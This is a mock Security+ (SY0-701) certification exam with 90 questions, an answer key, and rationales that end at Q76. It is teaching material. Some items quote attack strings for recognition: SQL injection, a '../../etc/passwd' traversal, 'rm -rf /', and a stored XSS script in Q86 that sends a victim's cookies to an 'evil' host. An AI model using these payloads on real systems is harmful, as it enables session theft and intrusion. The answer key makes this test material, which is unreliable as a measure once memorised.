# 🧪 Final Mock Exam — CompTIA Security+ (SY0-701)

> **Conditions:** 90 minutes. 90 questions. Closed book. Treat this as the REAL exam.
> **Pass mark:** 75/90 (~83%). The real Sec+ passes at 750/900 (~83%).
> Take this 2–3 days before your booked exam. Aim for **80+ correct**.
>
> 🧪 **Performance-Based Questions:** Questions 86–90 are PBQ-style multi-part scenarios. They are worth more on the real exam. Spend extra care.

---

## 📝 Questions

### 1. The CIA in CIA triad stands for:
A. Cryptography, Identity, Authorization
B. Confidentiality, Integrity, Availability
C. Compliance, Integrity, Audit
D. Control, Identification, Access

### 2. A digital signature provides:
A. Confidentiality only
B. Availability
C. Integrity, authentication, and non-repudiation
D. Encryption of bulk data

### 3. AES is which type of cipher?
A. Symmetric block
B. Asymmetric block
C. Hashing
D. Stream key exchange

### 4. RSA is primarily used for:
A. Hashing
B. Password storage
C. Bulk encryption of large files
D. Asymmetric encryption + digital signatures + key exchange

### 5. Which provides authenticated encryption?
A. AES-ECB
B. AES-GCM
C. AES-CBC
D. RC4

### 6. ECDHE provides:
A. AES key generation
B. Perfect Forward Secrecy via ephemeral elliptic-curve DH
C. Code signing
D. Password hashing

### 7. SHA-1 should NOT be used because:
A. It's too slow
B. It's open source
C. Collisions have been demonstrated
D. It requires HSM

### 8. Plain SHA-256 is INSUFFICIENT for passwords because:
A. It's reversible
B. It's too fast — needs salt + key stretching (bcrypt/Argon2/PBKDF2)
C. It produces 128-bit output
D. It's not a hash

### 9. The certificate file format that bundles cert + private key + chain is:
A. PEM
B. DER
C. PKCS#12 (.pfx)
D. PKCS#7

### 10. OCSP stapling improves OCSP by:
A. Server pre-fetching the OCSP response and attaching it to TLS
B. Encrypting the response
C. Replacing CRL
D. Requiring mutual TLS

### 11. A wildcard cert for `*.example.com` covers:
A. example.com only
B. Multi-level subdomains too
C. Any single-label subdomain (www, api, mail)
D. All TLDs

### 12. To digitally sign, you encrypt the hash with:
A. Sender's public key
B. Recipient's private key
C. Sender's private key
D. Recipient's public key

### 13. To encrypt for confidentiality to a recipient, you use:
A. Sender's private key
B. A shared symmetric key always
C. Sender's public key
D. Recipient's public key

### 14. AAA stands for:
A. Authentication, Authorization, Accounting
B. Audit, Access, Approval
C. Allowed, Approved, Audited
D. Authentication, Auditing, Approval

### 15. The Zero Trust component that evaluates policy and risk signals to make a decision is the:
A. Policy Enforcement Point
B. Implicit Trust Zone
C. Policy Administrator
D. Policy Engine

### 16. The Zero Trust component in the data plane that allows/blocks traffic is the:
A. Policy Engine
B. Policy Enforcement Point (PEP)
C. Policy Administrator
D. Threat Scope Reduction

### 17. "Adaptive Identity" means:
A. Identity claims change at runtime
B. Authentication strength scales with risk signals
C. The IdP rotates session keys
D. Multiple identities merge

### 18. Which is a managerial control?
A. Firewall rule
B. Antivirus quarantine
C. Door lock
D. Acceptable Use Policy

### 19. A "compensating" control is:
A. An alternative when the primary control isn't feasible
B. Always weaker than the primary
C. Free of charge
D. The strongest available

### 20. A visible camera at the entrance is:
A. Preventive only
B. Compensating
C. Corrective
D. Deterrent (and detective if recorded)

### 21. Comparing current security posture to ISO 27001 requires a:
A. Penetration test
B. Risk acceptance
C. Gap analysis
D. Tabletop exercise

### 22. Before deploying a high-impact production change, the FIRST formal step is:
A. Backout plan
B. Failover
C. Public announcement
D. Impact analysis + CAB approval

### 23. The 5 Sec+ authentication factors are know, have, are, do, and:
A. See
B. Remember
C. Where you are
D. Approve

### 24. MFA means:
A. Three factors minimum
B. Password + PIN
C. ≥2 factors from DIFFERENT categories
D. Any 2 passwords

### 25. The MOST phishing-resistant MFA method is:
A. SMS code
B. Push notification with Approve/Deny
C. FIDO2 / passkey hardware
D. Knowledge-based questions

### 26. SAML uses what data format?
A. JSON tokens
B. Binary
C. XML assertions
D. JWT

### 27. OAuth 2.0 is for:
A. Authentication
B. DNS lookup
C. Authorization (delegated access)
D. Crypto key exchange

### 28. OIDC adds to OAuth 2.0:
A. Authorization
B. CRL distribution
C. Authentication via id_token (JWT)
D. ARP resolution

### 29. Kerberos requires:
A. Single domain
B. Direct internet access
C. IPv6
D. Time synchronization (~5 min skew)

### 30. RADIUS by default uses:
A. UDP 1812 / 1813
B. TCP 49
C. TCP 443
D. UDP 514

### 31. TACACS+ uses:
A. UDP 514
B. UDP 1812
C. TCP 443
D. TCP 49

### 32. A US military system enforces clearance-based access regardless of owner is:
A. DAC
B. Rule-Based
C. RBAC
D. MAC

### 33. RBAC is BEST described as:
A. Owner-discretion based
B. Attribute-based dynamic
C. Permissions per role; users get roles
D. Time-based

### 34. JIT privileged access reduces risk by:
A. Encrypting admin passwords
B. Requiring biometrics only
C. Increasing logging volume
D. Limiting time window of standing privilege

### 35. NIST 800-63B's current guidance on periodic password rotation is:
A. Do NOT force rotation absent evidence of compromise
B. Every 90 days
C. Every 30 days
D. Weekly for admins

### 36. An MFA fatigue attack:
A. Bombards a user with push prompts hoping for a misclick
B. Brute forces hashes offline
C. Steals TOTP seeds
D. Forges signed certs

### 37. An APT is BEST characterized by:
A. Loud, fast destructive activity
B. Sales-driven motivation
C. Random teen hacker
D. Long-term, low-noise persistence by a well-resourced actor

### 38. Ransomware crews are usually motivated by:
A. Espionage
B. Revenge
C. Political beliefs
D. Financial gain

### 39. Hacktivists are usually motivated by:
A. Financial gain
B. Espionage
C. Curiosity only
D. Philosophical / political beliefs

### 40. The SolarWinds incident is best described as:
A. Supply-chain attack
B. DDoS
C. Phishing
D. Pretexting

### 41. A free US government-curated threat feed is:
A. Mandiant
B. Recorded Future
C. CrowdStrike Intel
D. AIS (CISA)

### 42. ISAC stands for:
A. Information Sharing and Analysis Center (industry-specific)
B. International Security Auth Center
C. Integrated System Audit Catalog
D. Independent Security Assessment Council

### 43. MITRE ATT&CK catalogs:
A. Compliance controls
B. Encryption algorithms
C. Adversary TTPs (Tactics, Techniques, Procedures)
D. Vendor contracts

### 44. A worm vs a virus is differentiated by:
A. The worm self-replicates over networks without user action
B. The virus is faster
C. The worm always exfiltrates data
D. The virus is fileless

### 45. Modern ransomware practices "double extortion" by:
A. Charging twice
B. Compromising two orgs
C. Encrypting AND exfiltrating, threatening leak if unpaid
D. Using two algorithms

### 46. The PRIMARY defense against SQL injection is:
A. Input length limits
B. Parameterized queries / prepared statements
C. WAF as the sole control
D. Disabling SQL

### 47. Stored XSS is:
A. XSS reflected in the URL
B. JavaScript persisted on the server that runs for every viewer
C. Server-side request forgery
D. Buffer overflow

### 48. CSRF is:
A. Cross-Site Request Forgery — victim browser tricked into request
B. Cross-Server Resource Federation
C. Server-Side Request Forgery
D. Code Signing Request Format

### 49. SSRF is:
A. Client-side script attack
B. SQL UNION attack
C. Switch-Side Routing Failure
D. Server-Side Request Forgery — server fetches attacker-controlled URLs

### 50. Directory traversal uses:
A. `../../etc/passwd`
B. `<script>...</script>`
C. `' OR 1=1 --`
D. `; rm -rf /`

### 51. TOCTOU is a:
A. Type of social engineering
B. Hashing weakness
C. Compliance gap
D. Race condition

### 52. A SYN flood exhausts:
A. RAM
B. The TCP half-open connection table
C. DNS cache
D. Disk space

### 53. A DNS amplification attack relies on:
A. Compromising the resolver
B. Spoofed source IPs + DNS responses much larger than queries
C. Encrypted DNS
D. Slow query timeouts

### 54. The Sec+ term for "man-in-the-middle" is:
A. On-path attack
B. Replay attack
C. Side-channel
D. Pivot

### 55. An "evil twin" wireless attack:
A. Is a Bluetooth attack
B. Is a worm pair
C. Impersonates a legit SSID with stronger signal
D. Is a Wi-Fi DDoS

### 56. Password spraying differs from brute force because spraying:
A. Tries one password against many users (avoiding lockout)
B. Tries many passwords against one user
C. Uses rainbow tables
D. Targets HMAC

### 57. Credential stuffing uses:
A. Pre-computed rainbow tables
B. Username/password pairs from a previous breach
C. Single password across many accounts
D. Pass-the-hash

### 58. Whaling targets:
A. Anyone
B. Executives specifically
C. Random IT staff
D. Vendors

### 59. Typosquatting registers:
A. Random domains
B. International domain names only
C. Misspelled versions of legitimate domains
D. Subdomains of victim domains

### 60. SFTP runs over:
A. TLS / 990
B. SSH / 22
C. FTP / 21
D. SCP / 873

### 61. LDAPS port is:
A. 389
B. 636
C. 443
D. 1812

### 62. SPF, DKIM, DMARC prevent:
A. Email domain spoofing
B. SQL injection
C. DDoS
D. Buffer overflows

### 63. A WAF protects:
A. Layer 7 (HTTP/S)
B. Layer 3
C. Layer 2
D. Layer 4

### 64. IDS vs IPS difference:
A. IDS = detect/alert; IPS = detect/block (inline)
B. IDS = host; IPS = network
C. IDS = cloud; IPS = on-prem
D. They're the same

### 65. IPSec Tunnel mode encrypts:
A. The entire original IP packet
B. The payload only
C. Just the IP header
D. Only the TCP handshake

### 66. PPTP should be:
A. Used for new VPN deployments
B. Used over public Wi-Fi only
C. Combined with WireGuard
D. Replaced (it is broken)

### 67. EDR adds what beyond AV?
A. More signatures
B. Faster scans
C. Hardware integration only
D. Behavioral telemetry, threat hunting, rollback, response

### 68. XDR extends EDR by:
A. More endpoints
B. Replacing the firewall
C. Correlating endpoint + network + cloud + email telemetry
D. Adding encryption

### 69. In IaaS, the customer is responsible for:
A. Guest OS, app, data, network configs in the VM
B. Hypervisor security
C. Physical facility
D. Server hardware

### 70. A public S3 bucket exposing customer data is:
A. AWS's fault under shared responsibility
B. The customer's misconfig
C. An IPv6 issue
D. A KMS bug

### 71. CASB primarily:
A. Hosts websites
B. Sits between users and cloud apps; enforces policy; finds shadow IT
C. Replaces SIEM
D. Provides EDR

### 72. ZTNA replaces:
A. SAML
B. Traditional VPN for user app access
C. EDR
D. CSPM

### 73. SCADA systems typically:
A. Patch monthly
B. Are public-cloud only
C. Have long lifecycles + limited patching + proprietary protocols
D. Use Kerberos

### 74. SIEM provides primarily:
A. Patching
B. Encryption at rest
C. Firewall mgmt
D. Log aggregation + correlation + alerting

### 75. SOAR primarily:
A. Adds log storage
B. Replaces SIEM
C. Orchestrates and automates response via playbooks
D. Replaces EDR

### 76. NIST IR phase order:
A. Detect → Prep → Eradicate → Contain → Recover → Lessons
B. Prep → Detect → Contain → Eradicate → Recover → Lessons
C. Prep → Contain → Detect → Eradicate → Recover → Lessons
D. Eradicate → Detect → Prep → Contain → Recover → Lessons

### 77. Order of volatility — capture FIRST:
A. Hard disk
B. RAM (volatile memory) and running process state
C. Email logs
D. Backup tapes

### 78. SSD secure sanitization techniques include all EXCEPT:
A. Degaussing
B. Physical destruction
C. Crypto-erase
D. Vendor secure-erase command

### 79. SLE × ARO equals:
A. ALE
B. EF
C. AV
D. ROI

### 80. RTO refers to:
A. Maximum acceptable data loss
B. Maximum acceptable downtime
C. Mean time to recover (engineering metric)
D. Backup retention

### 81. The 3-2-1 backup rule means:
A. 3 backups, 2 admins, 1 vault
B. 3 copies, 2 different media, 1 off-site
C. 3 generations, 2 tools, 1 audit
D. 3 days, 2 weeks, 1 month

### 82. A HIPAA-required contract with a vendor handling PHI is:
A. BAA
B. SLA
C. MOU
D. DPA

### 83. SCA finds:
A. Custom-code injection
B. IDS alerts
C. Phishing
D. Known-vulnerable third-party dependencies

### 84. Confidential computing protects data in which state?
A. At rest
B. In use
C. In transit
D. Archived

### 85. Pseudonymization vs anonymization (GDPR):
A. Identical
B. Pseudonymization is stronger
C. Pseudonymization is reversible with mapping; GDPR still applies. Anonymization is irreversible.
D. Anonymization uses bcrypt

---

## 🧪 PBQ Section (Q86–Q90)

These are multi-part performance-based questions. Read carefully — each part adds to the score.

### 86 (PBQ — Match attacks to indicators). Match each web log indicator to its attack name:
- (i) `id=42' UNION SELECT username,password FROM users--`
- (ii) `<script>document.location='http://evil/'+document.cookie</script>` saved in a forum post
- (iii) Request from internal IP to `http://169.254.169.254/latest/meta-data/`
- (iv) `GET /docs/../../etc/passwd HTTP/1.1`
- (v) `?next=https://attacker.example.com`

A. (i) SQLi, (ii) Stored XSS, (iii) SSRF, (iv) Directory traversal, (v) Open redirect
B. (i) XSS, (ii) SQLi, (iii) Replay, (iv) Buffer overflow, (v) SSRF
C. (i) CSRF, (ii) SQLi, (iii) DDoS, (iv) Pharming, (v) Phishing
D. (i) SSRF, (ii) Reflected XSS, (iii) SQLi, (iv) Open redirect, (v) CSRF

### 87 (PBQ — IR ordering). A SOC sees a host beaconing to a known C2 and laterally moving via SMB. Order these actions per the NIST IR lifecycle (earliest to latest):
- (A) Update playbooks with new IOCs
- (B) Capture memory image of the host
- (C) Determine scope of impact (which other hosts touched)
- (D) Isolate the host via EDR network containment
- (E) Wipe and rebuild
- (F) Restore user files from clean backup
- (G) Review and conduct post-incident meeting

A. C → B → D → E → F → G → A
B. E → D → B → C → F → A → G
C. A → C → B → D → E → F → G
D. D → C → B → A → E → F → G

### 88 (PBQ — Place network appliances). You're designing the network. Match each item to its zone (Internet / DMZ / Internal / Secure Zone / Management):
- (i) Public web servers
- (ii) DB servers reachable only from the web tier on specific ports
- (iii) Corporate file servers + employee laptops
- (iv) Jump server for admin SSH/RDP
- (v) WAF in front of the web tier
- (vi) NIDS sensor

A. (i) DMZ, (ii) Secure Zone, (iii) Internal, (iv) Management, (v) DMZ ingress (between Internet and DMZ), (vi) SPAN at chokepoints
B. (i) Internal, (ii) DMZ, (iii) Secure, (iv) DMZ, (v) Secure, (vi) Internet
C. (i) Secure, (ii) DMZ, (iii) Management, (iv) Internet, (v) DMZ, (vi) Internal
D. All in DMZ

### 89 (PBQ — Risk treatment + math). The Acme Corp risk register includes:
- Asset: HR database. AV = $2,000,000. EF per ransomware event = 25%. ARO = 0.20/year.
- Asset: Public marketing website. AV = $100,000. EF per DDoS = 50%. ARO = 1.0/year.

Calculate ALE for each AND pick the BEST risk treatment per asset.

A. HR ALE = $100,000; Website ALE = $50,000. HR: mitigate (immutable backups + EDR + MFA). Website: mitigate (CDN + DDoS protection).
B. HR ALE = $400,000; Website ALE = $200,000. HR: avoid. Website: accept.
C. HR ALE = $500,000; Website ALE = $100,000. Both: transfer.
D. HR ALE = $50,000; Website ALE = $25,000. Both: accept.

### 90 (PBQ — Match contract to scenario). For each scenario, pick the most appropriate document(s):
- (i) Company hires a SaaS vendor for a 6-month POC under an ongoing master agreement
- (ii) Vendor will process EU customer personal data
- (iii) Two healthcare providers exchange Protected Health Information for treatment continuity
- (iv) Two organizations agree on aspirational cooperation, non-binding
- (v) Two interconnecting systems define connection-specific security controls

A. (i) SOW (under MSA) + SLA, (ii) DPA, (iii) BAA, (iv) MOU, (v) ISA
B. (i) MSA, (ii) BAA, (iii) DPA, (iv) NDA, (v) BPA
C. (i) NDA, (ii) MOU, (iii) SLA, (iv) MSA, (v) DPA
D. All five = MSAs

---

## 🎯 Answer Key (No Cheating!)

```
1.  B    19. A    37. D    55. C    73. C
2.  C    20. D    38. D    56. A    74. D
3.  A    21. C    39. D    57. B    75. C
4.  D    22. D    40. A    58. B    76. B
5.  B    23. C    41. D    59. C    77. B
6.  B    24. C    42. A    60. B    78. A
7.  C    25. C    43. C    61. B    79. A
8.  B    26. C    44. A    62. A    80. B
9.  C    27. C    45. C    63. A    81. B
10. A    28. C    46. B    64. A    82. A
11. C    29. D    47. B    65. A    83. D
12. C    30. A    48. A    66. D    84. B
13. D    31. D    49. D    67. D    85. C
14. A    32. D    50. A    68. C    86. A
15. D    33. C    51. D    69. A    87. A
16. B    34. D    52. B    70. B    88. A
17. B    35. A    53. B    71. B    89. A
18. D    36. A    54. A    72. B    90. A
```

### PBQ explanations
- **#86** Classic indicator-to-attack matching: SQLi (UNION), stored XSS (persisted script tag), SSRF (cloud-metadata IP), directory traversal (`../`), open redirect (`?next=`).
- **#87** Order: D&A (scope → memory) → Containment (isolate) → Eradication (wipe) → Recovery (restore) → Lessons (playbook + meeting).
- **#88** Standard layered architecture: web in DMZ, DBs in Secure, employees Internal, jump server in Management, WAF in front of DMZ, sensors at SPAN ports.
- **#89** HR: SLE = $2M × 0.25 = $500k; ALE = $500k × 0.20 = **$100k**. Website: SLE = $100k × 0.50 = $50k; ALE = $50k × 1.0 = **$50k**. Both are significant enough that *mitigation* (controls) makes sense; avoidance is extreme, acceptance is wrong, transfer (insurance) might supplement but not replace.
- **#90** SOW + SLA for project scope/performance under MSA; DPA for GDPR; BAA for HIPAA; MOU for non-binding; ISA for system interconnection.

---

## Detailed answer rationales

> Every question explained: why correct, why each distractor is wrong, one-line exam takeaway.

**Q1. Answer: B — Confidentiality, Integrity, Availability.** The canonical Saltzer & Schroeder (1975) triad. **Wrong:** A/C/D invent expansions. **Takeaway.** CIA = C/I/A; never anything else.

**Q2. Answer: C — Integrity, authentication, and non-repudiation.** Signature = hash + sender's private key. **Wrong:** A (Conf only) is encryption. B (Availability) unrelated. D (Bulk encryption) is symmetric. **Takeaway.** Signature provides 3 properties; confidentiality not among them (unless paired with encryption).

**Q3. Answer: A — Symmetric block.** AES (FIPS 197). **Wrong:** B (Asym), C (Hash), D (Stream) all wrong. **Takeaway.** AES = symmetric block, 128-bit blocks.

**Q4. Answer: D — Asymmetric encryption + signatures + key exchange.** RSA's three uses. **Wrong:** A (Hashing), B (Passwords), C (Bulk) are wrong roles. **Takeaway.** RSA = asymmetric all-purpose; AES = symmetric bulk.

**Q5. Answer: B — AES-GCM.** Authenticated encryption (Galois/Counter Mode). **Wrong:** A (ECB) leaks patterns. C (CBC) is conf-only. D (RC4) is broken. **Takeaway.** Authenticated encryption → GCM.

**Q6. Answer: B — Perfect Forward Secrecy via ephemeral ECDH.** **Wrong:** A (AES gen) wrong. C (Code signing) is signature. D (Password hashing) wrong. **Takeaway.** ECDHE = PFS.

**Q7. Answer: C — Collisions demonstrated.** SHA-1 SHAttered (Google, 2017). **Wrong:** A (Slow) unrelated. B (Open source) wrong. D (HSM) unrelated. **Takeaway.** SHA-1 = deprecated due to collisions.

**Q8. Answer: B — Too fast; need salt + key stretching.** Same logic as PE-1 Q11. **Wrong:** A (Reversible) — SHA-256 is one-way but too fast. C (128-bit) wrong (it's 256). D (Not a hash) wrong. **Takeaway.** Passwords need bcrypt/Argon2/PBKDF2 with salt.

**Q9. Answer: C — PKCS#12 (.pfx).** Bundles cert + key + chain. **Wrong:** A (PEM) typical cert only. B (DER) binary cert. D (PKCS#7) chain without key. **Takeaway.** Cert+key+chain → PKCS#12.

**Q10. Answer: A — Server pre-fetches and attaches OCSP response.** Eliminates client roundtrip. **Wrong:** B (Encrypts response) wrong. C (Replaces CRL) — both can coexist. D (Mutual TLS) unrelated. **Takeaway.** Stapling = server attaches OCSP to TLS handshake.

**Q11. Answer: C — Any single-label subdomain.** `*.example.com` covers www/api/mail but NOT `a.b.example.com`. **Wrong:** A too narrow, B claims multi-level (wrong), D claims all TLDs (wrong). **Takeaway.** Wildcards cover one label only.

**Q12. Answer: C — Sender's private key.** Signing direction. **Wrong:** A/B/D scramble keys. **Takeaway.** Signing: sender's private. Verifying: sender's public.

**Q13. Answer: D — Recipient's public key.** Confidentiality direction. **Wrong:** A/B/C scramble. **Takeaway.** Confidentiality: recipient's public to encrypt, recipient's private to decrypt.

**Q14. Answer: A — Authentication, Authorization, Accounting.** **Wrong:** B/C/D invent. **Takeaway.** AAA = AuthN, AuthZ, Accounting.

**Q15. Answer: D — Policy Engine.** Brain of Zero Trust control plane. **Wrong:** A (PEP) enforces. B (Implicit zone) is data plane. C (PA) translates. **Takeaway.** PE evaluates; PA translates; PEP enforces.

**Q16. Answer: B — Policy Enforcement Point.** Data plane gate. **Wrong:** A (PE) is control. C (PA) is control. D (Threat Scope Reduction) is a concept. **Takeaway.** PEP = data plane gate.

**Q17. Answer: B — Auth strength scales with risk signals.** Adaptive Identity. **Wrong:** A (Identity changes at runtime) wrong. C (IdP rotates keys) wrong. D (Identity merging) wrong. **Takeaway.** Adaptive Identity = step-up MFA based on signals.

**Q18. Answer: D — Acceptable Use Policy.** Policy = managerial. **Wrong:** A (Firewall rule), B (AV quarantine), C (Door lock) are technical/physical. **Takeaway.** Policy = managerial. Tech = technical.

**Q19. Answer: A — Alternative when primary not feasible.** Same as PE-1 Q42. **Takeaway.** Compensating = substitute.

**Q20. Answer: D — Deterrent (and detective if recorded).** **Wrong:** A (Preventive only) misses the discouragement. B (Compensating) wrong context. C (Corrective) wrong. **Takeaway.** Visible camera = deterrent; recording reviewed = detective.

**Q21. Answer: C — Gap analysis.** Current vs target framework. **Wrong:** A (Pen test) finds vulns. B (Risk acceptance) is treatment. D (Tabletop) is exercise. **Takeaway.** Vs target framework → gap analysis.

**Q22. Answer: D — Impact analysis + CAB approval.** Same as PE-1 Q41. **Takeaway.** First step = impact + approval.

**Q23. Answer: C — Where you are.** Sec+ recognizes know/have/are/do/where. **Wrong:** A (See) invented. B (Remember) overlaps know. D (Approve) wrong. **Takeaway.** 5th factor = location.

**Q24. Answer: C — ≥2 factors from DIFFERENT categories.** MFA definition. **Wrong:** A (3+ min) wrong. B (Password+PIN) is same factor. D (2 passwords) is single factor. **Takeaway.** MFA = different categories.

**Q25. Answer: C — FIDO2 / passkey hardware.** Same as PE-1 Q18. **Takeaway.** Phishing-resistant = FIDO2.

**Q26. Answer: C — XML assertions.** SAML uses XML. **Wrong:** A (JSON), B (Binary), D (JWT) describe OIDC. **Takeaway.** SAML = XML.

**Q27. Answer: C — Authorization (delegated access).** OAuth. **Wrong:** A (Authentication) is OIDC. B (DNS) wrong. D (Key exchange) wrong. **Takeaway.** OAuth = authZ.

**Q28. Answer: C — Authentication via id_token (JWT).** OIDC adds authN. **Wrong:** A (Authorization) is OAuth's role. B (CRL) wrong. D (ARP) wrong. **Takeaway.** OIDC = OAuth + authN.

**Q29. Answer: D — Time synchronization (~5 min skew).** Kerberos tickets are time-bounded. **Wrong:** A (Single domain) — works across realms. B (Direct internet) wrong. C (IPv6) unrelated. **Takeaway.** Kerberos needs clock sync.

**Q30. Answer: A — UDP 1812/1813.** RADIUS. **Wrong:** B (TCP 49) is TACACS+. C (TCP 443) is HTTPS. D (UDP 514) is syslog. **Takeaway.** RADIUS = UDP 1812 (auth) / 1813 (acct).

**Q31. Answer: D — TCP 49.** TACACS+. **Wrong:** A (UDP 514) is syslog. B (UDP 1812) is RADIUS. C (TCP 443) is HTTPS. **Takeaway.** TACACS+ = TCP 49.

**Q32. Answer: D — MAC.** Same as PE-1 Q20. **Takeaway.** Military clearance → MAC.

**Q33. Answer: C — Permissions per role; users get roles.** RBAC. **Wrong:** A (Owner) is DAC. B (Attributes) is ABAC. D (Time) is rule-based. **Takeaway.** RBAC = role-based.

**Q34. Answer: D — Limits time window of standing privilege.** JIT. **Wrong:** A (Encrypting pw) is vaulting. B (Biometrics) is auth. C (More logs) is detection. **Takeaway.** JIT = time-boxed elevation.

**Q35. Answer: A — Do NOT force rotation absent compromise.** NIST 800-63B 2017+ guidance. **Wrong:** B/C/D are pre-2017 calendar-based. **Takeaway.** Modern guidance = no calendar rotation.

**Q36. Answer: A — Bombards with push prompts hoping for misclick.** MFA fatigue / push bombing. **Wrong:** B (Brute force offline) is hash crack. C (TOTP seeds) is seed theft. D (Forged signed certs) is PKI attack. **Takeaway.** Push fatigue → number-matching push or FIDO2.

**Q37. Answer: D — Long-term, low-noise persistence.** APT defining trait. **Wrong:** A (Loud/fast) describes ransomware. B (Sales) is unrelated. C (Random teen) is script kiddie. **Takeaway.** APT = patient + well-resourced + targeted.

**Q38. Answer: D — Financial gain.** Ransomware crews. **Wrong:** A (Espionage), B (Revenge), C (Political) are wrong motivations. **Takeaway.** Ransomware = financial.

**Q39. Answer: D — Philosophical / political beliefs.** Hacktivists. **Wrong:** A (Financial) = crime. B (Espionage) = APT. C (Curiosity only) wrong. **Takeaway.** Hacktivist = ideology.

**Q40. Answer: A — Supply-chain attack.** SolarWinds. **Wrong:** B (DDoS), C (Phishing), D (Pretexting) are wrong categories. **Takeaway.** Trojanized vendor update = supply chain.

**Q41. Answer: D — AIS (CISA).** Free US government. **Wrong:** A/B/C are commercial. **Takeaway.** Free + US govt → AIS.

**Q42. Answer: A — Information Sharing and Analysis Center.** **Wrong:** B/C/D invent. **Takeaway.** ISAC by sector.

**Q43. Answer: C — Adversary TTPs.** MITRE ATT&CK. **Wrong:** A (Compliance), B (Encryption), D (Contracts) wrong. **Takeaway.** ATT&CK = adversary TTPs.

**Q44. Answer: A — Worm self-replicates over networks without user action.** **Wrong:** B (Faster), C (Always exfil), D (Fileless) are wrong distinctions. **Takeaway.** Worm = self-spread no user.

**Q45. Answer: C — Encrypt AND exfiltrate, threaten leak.** Double extortion. **Wrong:** A (Charge twice), B (Two orgs), D (Two algorithms) misread. **Takeaway.** Double extortion = encrypt + exfil + leak threat.

**Q46. Answer: B — Parameterized queries.** Same as PE-1 Q27. **Takeaway.** Parameterized queries.

**Q47. Answer: B — Persisted server-side script that runs for every viewer.** Stored XSS. **Wrong:** A (URL reflected) is reflected. C (SSRF) is server-side. D (Buffer overflow) is memory. **Takeaway.** Stored XSS = persistent.

**Q48. Answer: A — Cross-Site Request Forgery.** **Wrong:** B/C/D invent expansions. **Takeaway.** CSRF = victim browser tricked into request.

**Q49. Answer: D — Server-Side Request Forgery.** **Wrong:** A (Client-side), B (SQL UNION), C (Routing) wrong. **Takeaway.** SSRF = server fetches attacker URLs.

**Q50. Answer: A — `../../etc/passwd`.** Directory traversal. **Wrong:** B (Script tags) is XSS. C (SQL) is injection. D (Shell metacharacters) is command injection. **Takeaway.** `../` = traversal.

**Q51. Answer: D — Race condition.** TOCTOU. **Wrong:** A (Social eng), B (Hash weakness), C (Compliance) wrong. **Takeaway.** TOCTOU = race.

**Q52. Answer: B — TCP half-open connection table.** SYN flood. **Wrong:** A (RAM) is generic. C (DNS) wrong. D (Disk) wrong. **Takeaway.** SYN flood exhausts TCP backlog.

**Q53. Answer: B — Spoofed source IPs + DNS responses larger than queries.** Amplification + reflection. **Wrong:** A (Compromised resolver) wrong. C (Encrypted DNS) wrong. D (Slow timeouts) wrong. **Takeaway.** Amplification = small request → big response with spoofed src.

**Q54. Answer: A — On-path attack.** **Wrong:** B (Replay), C (Side-channel), D (Pivot) wrong terms. **Takeaway.** MITM → on-path.

**Q55. Answer: C — Impersonates a legit SSID with stronger signal.** Evil twin. **Wrong:** A/B/D wrong categories. **Takeaway.** Evil twin = SSID impersonation.

**Q56. Answer: A — One password against many users.** Spraying. **Wrong:** B (Reverse — many pw vs one user) is brute. C (Rainbow tables) is offline hash. D (HMAC) unrelated. **Takeaway.** Spraying = 1 pw, many users.

**Q57. Answer: B — Username/password pairs from breach.** Credential stuffing. **Wrong:** A (Rainbow tables) is offline. C (Single pw) is spraying. D (PtH) is hash reuse. **Takeaway.** Stuffing = paired credentials from breach.

**Q58. Answer: B — Executives specifically.** Whaling. **Wrong:** A (Anyone), C (IT staff), D (Vendors) misframe. **Takeaway.** Whaling = executives.

**Q59. Answer: C — Misspelled versions of legitimate domains.** Typosquatting. **Wrong:** A (Random), B (IDN only), D (Subdomain takeover) wrong. **Takeaway.** Typosquatting = misspellings.

**Q60. Answer: B — SSH / 22.** SFTP. **Wrong:** A (TLS/990) is FTPS. C (FTP/21). D (SCP/873 — SCP is over SSH/22). **Takeaway.** SFTP = SSH/22.

**Q61. Answer: B — 636.** LDAPS. **Wrong:** A (389) plain. C (443) HTTPS. D (1812) RADIUS. **Takeaway.** LDAPS = 636.

**Q62. Answer: A — Email domain spoofing.** SPF/DKIM/DMARC. **Wrong:** B (SQLi), C (DDoS), D (Buffer) wrong. **Takeaway.** Email trio.

**Q63. Answer: A — Layer 7 (HTTP/S).** WAF. **Wrong:** B/C/D wrong layers. **Takeaway.** WAF = L7.

**Q64. Answer: A — IDS detect/alert; IPS detect/block (inline).** **Wrong:** B (host vs network) is HIDS/NIDS distinction. C (Cloud) wrong. D (Same) wrong. **Takeaway.** IDS passive; IPS inline.

**Q65. Answer: A — Entire original IP packet.** Tunnel mode. **Wrong:** B (Payload only) is Transport. C (Just header) wrong. D (TCP handshake) wrong. **Takeaway.** Tunnel = whole packet.

**Q66. Answer: D — Replace it.** PPTP is broken. **Wrong:** A/B/C suggest using it. **Takeaway.** PPTP = never.

**Q67. Answer: D — Behavioral telemetry, hunting, rollback, response.** EDR. **Wrong:** A/B/C describe incremental AV. **Takeaway.** EDR = behavior + response.

**Q68. Answer: C — Endpoint + network + cloud + email correlation.** XDR. **Wrong:** A (More endpoints), B (Replaces firewall), D (Encryption) misframe. **Takeaway.** XDR = cross-source correlation.

**Q69. Answer: A — Guest OS + app + data + network configs in VM.** IaaS customer responsibility. **Wrong:** B/C/D are provider's. **Takeaway.** IaaS: inside-VM = customer.

**Q70. Answer: B — Customer misconfig.** S3 bucket policy is customer's. **Wrong:** A (AWS fault) wrong. C (IPv6) wrong. D (KMS bug) wrong. **Takeaway.** Bucket config = customer.

**Q71. Answer: B — Between users and cloud apps; enforce policy; find shadow IT.** CASB. **Wrong:** A (Web hosting), C (Replace SIEM), D (EDR) wrong. **Takeaway.** CASB = SaaS broker.

**Q72. Answer: B — Traditional VPN for user app access.** ZTNA. **Wrong:** A (SAML), C (EDR), D (CSPM) wrong. **Takeaway.** ZTNA replaces VPN.

**Q73. Answer: C — Long lifecycle, limited patching, proprietary protocols.** SCADA. **Wrong:** A (Monthly patches), B (Public cloud), D (Kerberos) wrong. **Takeaway.** SCADA = legacy.

**Q74. Answer: D — Log aggregation + correlation + alerting.** SIEM. **Wrong:** A (Patching), B (Encryption), C (Firewall) wrong. **Takeaway.** SIEM = LACA.

**Q75. Answer: C — Orchestrates and automates response via playbooks.** SOAR. **Wrong:** A (Storage), B (Replaces SIEM), D (Replaces EDR) wrong. **Takeaway.** SOAR = automated response.

**Q76. Answer: B — Prep → Detect → Contain → Eradicate → Recover → Lessons.** NIST 800-61. **Wrong:** Other orderings scramble. **Takeaway.** PDCERL.

